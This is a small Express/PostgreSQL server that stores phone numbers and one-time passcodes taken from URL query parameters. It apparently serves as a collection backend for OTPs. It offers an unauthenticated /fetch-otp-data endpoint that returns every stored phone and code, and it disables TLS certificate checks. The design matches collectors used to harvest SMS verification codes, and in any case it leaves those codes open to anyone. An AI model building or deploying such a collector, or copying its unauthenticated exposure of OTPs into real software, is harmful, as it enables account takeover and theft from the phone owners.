const express = require('express');
const { Pool } = require('pg'); // PostgreSQL client
const path = require('path');

const app = express();

// PostgreSQL connection configuration
const pool = new Pool({
    connectionString: process.env.DATABASE_URL, // Use DATABASE_URL environment variable
    ssl: {
        rejectUnauthorized: false, // Required for Railway PostgreSQL setup
    },
});

// Ensure the 'otps' table exists in the database
pool.query(
    `CREATE TABLE IF NOT EXISTS otps (
        id SERIAL PRIMARY KEY,
        phone VARCHAR(20) NOT NULL,
        otp VARCHAR(10) NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    );`,
    (err, res) => {
        if (err) {
            console.error('Error creating table:', err);
        } else {
            console.log('Table creation successful or already exists.');
        }
    }
);

// Endpoint to receive phone and OTP
app.get('/', async (req, res) => {
    const phone = req.query.phone;
    const otp = req.query.otp;

    if (!phone || !otp) {
        return res.status(400).json({
            message: 'Phone number and OTP are required',
            status: 'error',
        });
    }

    try {
        // Insert phone and OTP into the database
        await pool.query('INSERT INTO otps (phone, otp) VALUES ($1, $2)', [phone, otp]);

        res.status(200).json({
            message: `OTP ${otp} received for phone ${phone}`,
            status: 'success',
        });
    } catch (error) {
        console.error('Error saving OTP:', error);
        res.status(500).json({
            message: 'Error saving OTP',
            status: 'error',
        });
    }
});

// Endpoint to fetch all OTP data
app.get('/fetch-otp-data', async (req, res) => {
    try {
        // Fetch all OTP data from the database
        const result = await pool.query('SELECT phone, otp, created_at FROM otps ORDER BY id DESC');
        res.json(result.rows);
    } catch (error) {
        console.error('Error fetching OTP data:', error);
        res.status(500).json({
            message: 'Error fetching OTP data',
            status: 'error',
        });
    }
});

// Serve static HTML from 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
